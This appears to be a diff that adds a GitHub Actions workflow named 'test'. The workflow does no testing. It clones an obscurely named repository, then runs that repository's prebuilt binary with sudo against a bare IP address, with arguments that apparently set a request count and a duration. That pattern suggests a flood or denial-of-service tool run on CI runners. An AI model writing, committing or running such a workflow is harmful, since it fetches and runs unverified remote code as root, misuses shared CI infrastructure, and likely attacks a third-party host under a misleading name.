@@ -1,0 +1,22 @@
+name: test
+
+on: [workflow_dispatch]
+
+jobs:
+  clone-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout current repository
+      uses: actions/checkout@v4
+
+    - name: Clone target repository
+      run: git clone https://github.com/sdasdsaddd33/sxsadadsdas-t123erstss.git ./target-repo
+
+    - name: Make main executable
+      run: chmod +x ./target-repo/main
+
+    - name: Run compiled Go binary with sudo
+      run: |
+        cd ./target-repo
+        sudo ./main http://36.3.104.69/ 10000 1800
